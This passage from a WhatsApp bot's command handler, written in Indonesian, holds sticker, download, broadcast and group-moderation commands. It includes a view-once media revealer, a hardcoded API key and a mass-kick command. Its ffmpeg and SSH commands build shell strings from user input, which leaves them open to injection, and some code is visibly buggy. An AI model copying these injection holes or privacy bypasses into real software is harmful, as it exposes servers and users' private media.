            return Reply("❗ FPS harus antara 30 - 240 (contoh: 60fps)");
        }
    }

    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || q.mediaType || '';
    if (!/^video/.test(mime)) return Reply("Perintah ini hanya untuk video. Silakan Reply video yang ingin diubah.");
    
    if (!resolutions[res]) return Reply(`Resolusi tidak valid.\n\nPilihan: ${Object.keys(resolutions).join(", ")}\nContoh: ${prefix + command} 1080`);

    conn.videohd[m.sender] = true;
    let inputPath;
    let outputPath;

    try {
        await Reply(`⏳ Mengubah video ke ${res.toUpperCase()} ${fps}FPS...`);
        
        const tmpDir = './tmp';
        if (!fs.existsSync(tmpDir)) {
            fs.mkdirSync(tmpDir, { recursive: true });
        }

        const id = m.sender.split("@")[0];
        inputPath = `./tmp/input_${id}.mp4`;
        outputPath = `./tmp/hdvideo_${id}.mp4`;
        
        const buffer = await conn.downloadMediaMessage(q);
        fs.writeFileSync(inputPath, buffer);

        if (!fs.existsSync(inputPath)) {
            throw new Error("Gagal menyimpan file video sementara. Cek izin folder atau coba lagi.");
        }

        const targetHeight = resolutions[res];
        const form = new FormData();
        form.append("video", fs.createReadStream(inputPath));
        form.append("resolution", targetHeight);
        form.append("fps", fps);

        const response = await axios.post("http://193.149.164.168:4167/hdvideo", form, {
            headers: form.getHeaders(), maxBodyLength: Infinity,
            maxContentLength: Infinity, responseType: "stream"
        });

        const writer = fs.createWriteStream(outputPath);
        response.data.pipe(writer);

        writer.on("finish", async () => {
            try {
                const videoBuffer = fs.readFileSync(outputPath);
                await conn.sendMessage(m.chat, {
                    video: videoBuffer, mimetype: 'video/mp4',
                    fileName: `video_${res}_${fps}fps.mp4`,
                    caption: `✅ Video berhasil diubah ke ${res.toUpperCase()} ${fps}FPS`
                }, { quoted: m });
            } catch (sendError) {
                Reply("Gagal mengirim video yang telah diproses.");
            } finally {
                delete conn.videohd[m.sender];
                if (fs.existsSync(inputPath)) fs.unlinkSync(inputPath);
                if (fs.existsSync(outputPath)) fs.unlinkSync(outputPath);
            }
        });
        
        writer.on("error", (err) => {
            throw new Error("Gagal menulis file video yang telah diproses.");
        });

    } catch (e) {
        Reply("Terjadi kesalahan: " + e.message);
        delete conn.videohd[m.sender];
        if (inputPath && fs.existsSync(inputPath)) fs.unlinkSync(inputPath);
        if (outputPath && fs.existsSync(outputPath)) fs.unlinkSync(outputPath);
    }
}
break

            case 'bratvid': {
    if (!text) return Reply(`Contoh: ${prefix + command} halo dunia`);

    const words = text.split(" ");
    const tempDir = path.join(process.cwd(), 'lib');
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

    const framePaths = [];

    try {
        // Download frame video untuk setiap kata
        for (let i = 0; i < words.length; i++) {
            const currentText = words.slice(0, i + 1).join(" ");

            let res;
            try {
                res = await axios.get(
                    `https://aqul-brat.hf.space/?text=${encodeURIComponent(currentText)}`, 
                    { responseType: "arraybuffer" }
                );
            } catch (err) {
                console.error(`Gagal fetch frame ${i}:`, err.message);
                continue; // skip frame gagal
            }

            const framePath = path.join(tempDir, `frame_${Date.now()}_${i}.mp4`);
            fs.writeFileSync(framePath, res.data);
            framePaths.push(framePath);
        }

        if (framePaths.length === 0) return Reply("Gagal membuat video, coba lagi.");

        // Buat file list untuk ffmpeg concat
        const fileListPath = path.join(tempDir, `filelist_${Date.now()}.txt`);
        let fileListContent = "";
        framePaths.forEach((frame) => {
            fileListContent += `file '${frame}'\n`;
            fileListContent += `duration 0.7\n`;
        });
        fileListContent += `file '${framePaths[framePaths.length - 1]}'\n`;
        fileListContent += `duration 2\n`;
        fs.writeFileSync(fileListPath, fileListContent);

        // Output video
        const outputVideoPath = path.join(tempDir, `output_${Date.now()}.mp4`);
        execSync(
            `ffmpeg -y -f concat -safe 0 -i "${fileListPath}" -vf "fps=30" -c:v libx264 -preset veryfast -pix_fmt yuv420p "${outputVideoPath}"`
        );

        // Kirim video sebagai sticker
        await conn.sendAsSticker(m.chat, outputVideoPath, m, {
            packname: 'Sticker by ',
            author: global.author
        });

        // Hapus sementara file
        framePaths.forEach((frame) => fs.existsSync(frame) && fs.unlinkSync(frame));
        fs.existsSync(fileListPath) && fs.unlinkSync(fileListPath);
        fs.existsSync(outputVideoPath) && fs.unlinkSync(outputVideoPath);

    } catch (e) {
        console.error("Terjadi kesalahan:", e);
        Reply('Terjadi kesalahan saat memproses permintaan!');
    }
}
break;
case "bratjalan": {
if (!text) return Reply("Contoh:\n.bratvid kelpin ganteng")

const { exec } = require("child_process")
const fs = require("fs")

let name = Date.now()
let mp4 = `./tmp/${name}.mp4`
let webp = `./tmp/${name}.webp`

let safe = text.replace(/['"]/g,"")
let formatted = safe.match(/.{1,15}/g).join("\n")

let cmd1 = `ffmpeg -f lavfi -i color=c=black:s=512x512:d=4 -vf "drawtext=text='${formatted}':fontcolor=white:fontsize=45:line_spacing=10:x=(w-text_w)/2:y=h-mod(t*100\\,h+text_h)" -y ${mp4}`

exec(cmd1, (err) => {
if (err) return Reply("❌ Gagal membuat animasi")

let cmd2 = `ffmpeg -i ${mp4} -vcodec libwebp -filter:v fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 ${webp}`

exec(cmd2, async (err2) => {
if (err2) return Reply("❌ Gagal convert sticker")

try {

let videoBuffer = fs.readFileSync(webp)

await conn.sendAsSticker(m.chat, videoBuffer, m, { 
packname: global.packname,
author: global.author
})

} catch (e) {
console.log(e)
Reply("❌ Gagal kirim sticker")
}

fs.unlinkSync(mp4)
fs.unlinkSync(webp)

})

})

}
break
case "brat": {
if (!text) return Reply('contoh .brat kelpin ganteng')
const axios = require('axios');
let brat = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false&delay=500`
let response = await axios.get(brat, { responseType: "arraybuffer" })
let videoBuffer = response.data;
try {
await conn.sendAsSticker(m.chat, videoBuffer, m, { 
packname: global.packname,
author: global.author
})
} catch {}
}
break

case "bratgambar2": {
  if (!text) {
    const colorList = `
*Daftar Kode Warna Umum*

*Dasar:*
• Hitam: #000000
• Putih: #FFFFFF
• Merah: #FF0000
• Hijau: #00FF00
• Biru: #0000FF
• Kuning: #FFFF00
• Cyan: #00FFFF
• Magenta: #FF00FF

*Lainnya:*
• Abu: #808080
• Navy: #000080
• Orange: #FFA500
• Pink: #FFC0CB
• Emas: #FFD700

Format: 
*bratimg2 teks | fontColor | bgColor*
Contoh:
bratimg2 Halo World | #FF0000 | #FFFFFF
`.trim();
    return Reply(colorList);
  }
  const axios = require('axios');
  const [teks, fontColor, bgColor] = text.split("|").map(v => v?.trim());
  const finalText = teks || 'Yubi 😗😗';
  const finalFontColor = fontColor || '#000000';
  const finalBgColor = bgColor || '#FFFFFF';
  const apiUrl = `https://fastrestapis.fasturl.cloud/maker/brat/advanced?text=${encodeURIComponent(finalText)}&font=Arial&fontSize=auto&fontPosition=justify&fontBlur=3&fontColor=${encodeURIComponent(finalFontColor)}&bgColor=${encodeURIComponent(finalBgColor)}`;

  try {
    let response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    let buffer = response.data;
    await conn.sendAsSticker(m.chat, buffer, m, { packname: global.packname });
  } catch (err) {
    console.error("Error bratimg2:", err);
    Reply('Gagal membuat sticker. Coba lagi nanti.');
  }
}
break

case "cekidch": case "idch": {
if (!text) return Reply(example("linkchnya 🤨"))
if (!text.includes("https://whatsapp.com/channel/")) return Reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res
try {
res = await conn.newsletterMetadata("invite", result)
} catch (e) {
console.error('newsletterMetadata error:', e?.message || e)
return Reply("❌ Gagal mengambil metadata saluran. Bot mungkin baru saja reconnect, coba lagi em alguns segundos.")
}
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}

> \`ᴄʀᴇᴀᴛᴇᴅ ʙʏ: 𝐤𝐞𝐥𝐩𝐢𝐧\` `
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy ID Channel\",\"id\":\"123456789\",\"copy_code\":\"${res.id}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m})
await conn.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case "rvo": case "readviewonce": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return Reply(example("dengan Reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return Reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return conn.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return conn.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return conn.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

case 'tourl2': {
    const fetch = require('node-fetch');
    const FormData = require('form-data');
    const q = m.quoted ? m.quoted : m;
    const mimetype = (q.msg || q).mimetype || q.mediaType || '';
    if (!/webp/.test(mimetype)) {
        conn.sendMessage(m.chat, {
            react: {
                text: '⏰',
                key: m.key,
            }
        });

        try {
            const media = await q.download?.();
            const fileSizeInBytes = media.length;
            const fileSizeInKB = (fileSizeInBytes / 1024).toFixed(2);
            const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);
            const fileSize = fileSizeInMB >= 1 ? `${fileSizeInMB} MB` : `${fileSizeInKB} KB`;
            const form = new FormData();
            form.append('reqtype', 'fileupload');
            let ext = mimetype.split('/')[1] || '';
            if (ext) ext = `.${ext}`;
            form.append('fileToUpload', media, `file${ext}`);
            const res = await fetch('https://catbox.moe/user/api.php', {
                method: 'POST',
                body: form
            });
            const result = await res.text();
            const url = result.trim();
            const caption = `🔗 URL: ${url}\n\n*Ukuran:* ${fileSize}`;
            await conn.sendMessage(m.chat, { text: caption }, { quoted: m });
        } catch (e) {
            console.error(e);
            Reply(`[ ! ] Gagal mengunggah file. Error: ${e.message}`);
        }
    } else {
        Reply(`File *.webp* tidak didukung. Kirim atau Reply file lain dengan caption *${usedPrefix + command}*`);
    }
};
break

case 'yt':
case 'youtube': {
 const axios = require('axios');
 if (!text) return Reply(`Contoh penggunaan:
• yt search kelpin Gv
• yt channel kelpin Gv
• yt latest alquiz ganteng
• yt stat https://youtube.com/watch?v=abc123`);

 const subcmd = text.split(' ')[0].toLowerCase();
 const query = text.replace(subcmd, '').trim();
 const apikey = 'AIzaSyBI6P58kEwxWywxh_UeCUpQC7_T5xwieTg';

 if (!['search', 'channel', 'latest', 'stat'].includes(subcmd))
 return Reply('Subfitur tidak dikenal. Gunakan salah satu: search, channel, latest, stat');

 try {
 if (subcmd === 'search') {
 if (!query) return Reply('Contoh: yt search lofi chill');
 const { data } = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
 params: {
 part: 'snippet',
 q: query,
 key: apikey,
 type: 'video',
 maxResults: 30 // lu atur aj bebas
 }
 });

 if (!data.items.length) return Reply('Video tidak ditemukan.');
 let teks = '*Hasil Pencarian YouTube:*\n\n';
 data.items.forEach(v => {
 teks += `• *${v.snippet.title}*\n`;
 teks += ` Channel: ${v.snippet.channelTitle}\n`;
 teks += ` Link: https://youtube.com/watch?v=${v.id.videoId}\n\n`;
 });
 return Reply(teks);
 }

 if (subcmd === 'channel') {
 if (!query) return Reply('Contoh: yt channel lofi girl');
 const search = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
 params: {
 part: 'snippet',
 q: query,
 type: 'channel',
 key: apikey
 }
 });

 const ch = search.data.items[0];
 if (!ch) return Reply('Channel tidak ditemukan.');
 const channelId = ch.id.channelId;
 const detail = await axios.get(`https://www.googleapis.com/youtube/v3/channels`, {
 params: {
 part: 'snippet,statistics,brandingSettings',
 id: channelId,
 key: apikey
 }
 });

 const info = detail.data.items[0];
 if (!info) return Reply('Gagal mengambil detail channel.');
 const bannerUrl = info.brandingSettings?.image?.bannerExternalUrl;
 const cap = `*Channel Info:*
• *Nama:* ${info.snippet.title}
• *Subscriber:* ${info.statistics.subscriberCount}
• *Views:* ${info.statistics.viewCount}
• *Total Video:* ${info.statistics.videoCount}
• *Dibuat:* ${new Date(info.snippet.publishedAt).toLocaleDateString()}
• *Lokasi:* ${info.snippet.country || 'Tidak diketahui'}
• *Link:* https://youtube.com/channel/${channelId}

*Deskripsi:*\n${info.snippet.description?.slice(0, 500) || 'Tidak ada deskripsi.'}`;

 await conn.sendMessage(m.chat, {
 image: { url: info.snippet.thumbnails.high.url },
 caption: cap
 }, { quoted: m });

 if (bannerUrl) await conn.sendMessage(m.chat, {
 image: { url: bannerUrl },
 caption: 'Banner Channel'
 }, { quoted: m });
 return;
 }

 if (subcmd === 'latest') {
 if (!query) return Reply('Contoh: yt latest lofi girl');
 const search = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
 params: {
 part: 'snippet',
 q: query,
 type: 'channel',
 key: apikey
 }
 });

 const ch = search.data.items[0];
 if (!ch) return Reply('Channel tidak ditemukan.');
 const channelId = ch.id.channelId;
 const latest = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
 params: {
 key: apikey,
 channelId,
 part: 'snippet,id',
 order: 'date',
 maxResults: 1
 }
 });

 const vid = latest.data.items[0];
 if (!vid) return Reply('Video terbaru tidak ditemukan.');
 const caption = `*Video Terbaru dari ${vid.snippet.channelTitle}:*
• *Judul:* ${vid.snippet.title}
• *Link:* https://youtube.com/watch?v=${vid.id.videoId}`;

 return conn.sendMessage(m.chat, {
 image: { url: vid.snippet.thumbnails.high.url },
 caption
 }, { quoted: m });
 }

 if (subcmd === 'stat') {
 if (!query.includes('youtube.com/watch')) return Reply('Contoh: yt stat https://youtube.com/watch?v=abc123');
 const videoId = new URL(query).searchParams.get('v');
 const res = await axios.get(`https://www.googleapis.com/youtube/v3/videos`, {
 params: {
 part: 'snippet,statistics,status,contentDetails',
 id: videoId,
 key: apikey
 }
 });

 const video = res.data.items[0];
 if (!video) return Reply('Video tidak ditemukan.');
 const cap = `*Statistik Video:*
• *Judul:* ${video.snippet.title}
• *Channel:* ${video.snippet.channelTitle}
• *Tayang:* ${new Date(video.snippet.publishedAt).toLocaleDateString()}
• *Views:* ${video.statistics.viewCount}
• *Likes:* ${video.statistics.likeCount}
• *Komentar:* ${video.statistics.commentCount}
• *Kategori ID:* ${video.snippet.categoryId}
• *Status:* ${video.status.privacyStatus}
• *Lisensi:* ${video.status.license}
• *Tags:* ${video.snippet.tags?.slice(0, 5).join(', ') || 'Tidak ada tag'}
• *Link:* https://youtube.com/watch?v=${videoId}

*Deskripsi:* 
${video.snippet.description?.slice(0, 1000) || 'Tidak ada deskripsi.'}`;
 return Reply(cap);
 }
 } catch (err) {
 console.error(err);
 return Reply('Gagal mengambil data dari YouTube. Coba lagi nanti.');
 }
}
break
case "carimusik":
case "ytmp3": {
    if (!text) return Reply(`⚡ *KELPIN PLAY2*

Gunakan dengan cara:
.play2 <judul lagu/video>

Contoh:
.play2 dj jedag jedug
.play2 audio meme 30 detik`);

    try {
        const yts = require('yt-search');
        const ress = await yts(text);

        if (!ress || !ress.all || ress.all.length < 1)
            return Reply("❌ Audio/video tidak ditemukan.");

        await Reply("⏳ Memproses download audio, tunggu sebentar...");

        const { title, url, thumbnail, timestamp, author } = ress.all[0];

        const data = await fetchJson(`https://api.skyzopedia.web.id/download/ytdl-mp3?apikey=skyy&url=${url}`);
        if (!data.result || !data.result.download)
            return Reply("❌ Error saat mengambil audio.");

        await conn.sendMessage(m.chat, {
            audio: { url: data.result.download },
            mimetype: "audio/mpeg",
            ptt: false,
            contextInfo: {
                externalAdReply: {
                    title: title,
                    body: `Duration: ${timestamp} || Creator: ${author.name}`,
                    thumbnailUrl: thumbnail,
                    renderLargerThumbnail: true,
                    mediaType: 1,
                    sourceUrl: url
                }
            }
        }, { quoted: m });

    } catch (err) {
        console.error(err);
        return Reply("❌ Error! terjadi kesalahan pada server.");
    }
}
break;
case 'ytmp4':
case 'play': {
    if (!text) return Reply(`Contoh:\n.ytmp4 lathi`)

    const axios = require('axios')
    const yts = require('yt-search')

    await Reply("⏳ Mengambil video...")

    try {
        let url = text
        let thumb = ""
        let title = ""

        // 🔥 kalau bukan link → search
        if (!text.includes("youtu")) {
            let search = await yts(text)
            if (!search.videos.length) return Reply("❌ Video tidak ditemukan")
            url = search.videos[0].url
            thumb = search.videos[0].thumbnail
            title = search.videos[0].title
        }

        let { data } = await axios.get(`https://ndikz-api.vercel.app/download/ytmp4?url=${encodeURIComponent(url)}`)

        if (!data.status || !data.download) return Reply("❌ Gagal mengambil video")

        // 🔥 kalau dari link langsung → ambil thumbnail juga
        if (!thumb) {
            let search = await yts(url)
            thumb = search.videos[0]?.thumbnail || ""
            title = data.title || search.videos[0]?.title || "Video"
        }

        // 🔥 kirim thumbnail dulu
        if (thumb) {
            await conn.sendMessage(m.chat, {
                image: { url: thumb },
                caption: `🎬 *${title}*\n\n📥 Sedang mengirim video...`
            }, { quoted: m })
        }

        // 🔥 kirim video (auto + fallback)
        try {
            await conn.sendMessage(m.chat, {
                video: { url: data.download },
                caption: `🎥 ${title}`
            }, { quoted: m })
        } catch {
            let res = await axios.get(data.download, { responseType: "arraybuffer" })

            await conn.sendMessage(m.chat, {
                video: res.data,
                caption: `🎥 ${title}`
            }, { quoted: m })
        }

    } catch (e) {
        console.error(e)
        Reply("❌ Error video")
    }
}
break;

//~~~~~~~~~~~~~FITUR JPMCH~~~~~~~~~~~~~~~~~//

case "jpmch": {
 if (!isCreator) return Reply(mess.owner) 
 if (!text && !m.quoted) return Reply(example("Teksnya atau Reply teks")); 
 var teks = m.quoted ? m.quoted.text : text; 
 let total = 0; 
 
 global.channels = loadChannels(); 
 
 if (global.channels.length === 0) 
 return Reply(` 
╔══════════════════════════╗ 
 ❌ *SALAHAN* ❌ 
╚══════════════════════════╝ 
⚠️ Tidak ada saluran terdaftar untuk *JPM*! 
Silakan daftarkan saluran terlebih dahulu. 
`); 

 Reply(` 
╭─❰ *PROCESSING MESSAGE* ❱─╮ 
📮 *Mengirim Pesan Ke*: 
 ➥ *${global.channels.length} Saluran* 
⏳ *Mohon Tunggu...* 
╰─────────────────────╯ 
 `); 
 
 for (let id of global.channels) { 
 try { 
 await conn.sendMessage(id, { text: teks }, { quoted: qloc }); 
 total += 1; 
 } catch (e) { 
 console.log(`⚠️ Gagal mengirim ke ${id}:`, e); 
 } 
 await sleep(global.delayjpmch); // jeda tiap pengiriman 
 } 
 
 Reply(` 
╭─❰ *RESULT SUMMARY* ❱─╮ 
📨 *Pesan Terkirim*: 
 ➥ *${total} Saluran* 
✅ *Status*: Berhasil! 
*Jeda : ${global.cooldown}*
💌 Terima kasih telah menggunakan layanan ini. 
╰─────────────────────╯ 
 `); 
} 
break

case "delidch": {
    if (!isCreator) return Reply(mess.owner);
    if (!text) return Reply("Harap masukkan nomor atau ID saluran yang ingin dihapus!");

    global.channels = loadChannels();

    if (!isNaN(text)) {
        let index = parseInt(text.trim()) - 1;

        if (start < 0 || start >= global.channels.length) {
            return Reply("Nomor urut tidak valid!");
        }

        let removed = global.channels.splice(index, 1);
        saveChannels(global.channels);

        Reply(`Berhasil menghapus ID Saluran: *${removed[0]}*`);
    } else {
        let channelId = text.trim();

        if (!global.channels.includes(channelId)) {
            return Reply("ID Saluran tidak ditemukan!");
        }

        global.channels = global.channels.filter((id) => id !== channelId);
        saveChannels(global.channels);

        Reply(`Berhasil menghapus ID Saluran: *${channelId}*`);
    }
}
break

case "addidch": {
 if (!isCreator) return Reply(!isOwner);
 if (!text) return Reply("Harap masukkan link saluran!");

 let channelLink = text.trim();

 if (!channelLink.includes("https://whatsapp.com/channel/")) {
 return Reply("Link saluran tidak valid! Harus berupa link WhatsApp (https://whatsapp.com/channel/...)");
 }

 let channelId = channelLink.split("https://whatsapp.com/channel/")[1];
 if (!channelId) return Reply("Gagal mengekstrak ID dari link saluran!");

 try {
 let res = await conn.newsletterMetadata("invite", channelId);

 if (!res.id) return Reply("ID saluran tidak valid!");

 global.channels = loadChannels();

 if (global.channels.includes(res.id)) {
 return Reply(`ID Saluran *${res.id}* sudah terdaftar!`);
 }

 global.channels.push(res.id);
 saveChannels(global.channels);

 Reply(`Berhasil menambahkan ID Saluran *${res.id}* dari link:\n${channelLink}\n\nNama Saluran: ${res.name}`);
 } catch (e) {
 console.error(e);
 Reply("Terjadi kesalahan saat memproses link saluran. Pastikan link valid!");
 }
}
break

//~~~~~~~~~~~~~PENJAGA GRUP~~~~~~~~~~~~~~~~~//

case "tagall": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return Reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await conn.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

case "add": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return Reply("Nomor tidak terdaftar di whatsapp")
const res = await conn.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return Reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return Reply(JSON.stringify(res, null, 2))
}} else {
return Reply(example("62838###"))
}
}
break

case "h": case "ht": case "hidetag": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return Reply(example("teksnya mana😹"))
let member = m.metadata.participants.map(v => v.id)
await conn.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break
case "totag": {
    if (!isCreator && !isPremium) return Reply(mess.owner);

    // pastikan user membalas pesan
    if (!quoted || !quoted.message) return Reply(`Reply pesan teks yang ingin di-tag semua!`);

    // ambil semua anggota grup
    let members = m.metadata?.participants?.map(v => v.id) || [];

    // ambil teks dari pesan yang di-Reply
    let content;
    if (quoted.message.conversation) {
        content = quoted.message.conversation;
    } else if (quoted.message.extendedTextMessage) {
        content = quoted.message.extendedTextMessage.text;
    } else {
        return Reply("Hanya mendukung pesan teks saja.");
    }

    // kirim ulang teks + mention semua
    await conn.sendMessage(
        m.chat,
        { text: content, mentions: members },
        { quoted: m }
    );
}
break
case "kick": case "kik": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return Reply("Nomor tidak terdaftar di whatsapp")
const res = await conn.groupParticipantsUpdate(m.chat, [input], 'remove')
await Reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return Reply(example("@tag/Reply"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "leave": {
if (!isCreator && !isPremium) return Reply(mess.owner)
await Reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await conn.groupLeave(m.chat)
}
break

case "closegc": case "close": 
case "opengc": case "open": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await conn.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await conn.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

case "kudeta": case "kickallmem": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return Reply("Grup Ini Sudah Tidak Ada Member!")
await Reply("Kudeta Grup By Kelpin 🔥")
for (let i of memberFilter) {
await conn.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await Reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break
case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./MutanoX-Bot.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
Reply(`${getcase(q)}`)
} catch (e) {
return Reply(`Case *${text}* tidak ditemukan`)
}
}
brea
case "demote":
case "promote": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await conn.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await conn.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return Reply(example("@tag/6285###"))
}
}
break

case "mute": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return Reply(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return Reply("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return Reply(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return Reply("Berhasil mematikan *mute* di grup ini")
} else return Reply(example("on/off"))
}
break 
case "welcome": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return Reply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return Reply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return Reply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return Reply("Berhasil mematikan *welcome* di grup ini")
} else return Reply(example("on/off"))
}
break

case 'antilinkch': {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
 if (!antichannel[m.chat]) antichannel[m.chat] = { active: false, warnings: {}, antichannel: false }

 const argsLower = q.toLowerCase();
 if (argsLower === 'on') {
 antichannel[m.chat].antichannel = true;
 saveAntichannel();
 Reply('✅ Anti Link Channel WhatsApp AKTIF!');
 } else if (argsLower === 'off') {
 antichannel[m.chat].antichannel = false;
 saveAntichannel();
 Reply('❌ Anti Link Channel WhatsApp NONAKTIF!');
 } else {
 Reply(`Contoh:\n*${prefix}antichannel on*\n*${prefix}antichannel off*`);
 }
}
break

case "startwings": case "configurewings": {
let t = text.split('|')
if (t.length < 3) return Reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await Reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
Reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
Reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "cvps": {
if (!text) return Reply(example("hostname"))
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram & Cpu Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16GB || CPU 4', 
                  id: `.r16c4 ${text}`
                },
                {
                  title: 'Ram 1GB || CPU 1', 
                  id: `.r1c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 1', 
                  id: `.r2c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 2', 
                  id: `.r2c2 ${text}`
                },
                {
                  title: 'Ram 4GB || CPU 2', 
                  id: `.r4c2 ${text}`
                },      
                {
                  title: 'Ram 8GB || CPU 4', 
                  id: `.r8c4 ${text}`
                }                     
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Spesifikasi Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4": case "r16c4": {
if (!isCreator) return Reply(mess.owner)
if (!text) return
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
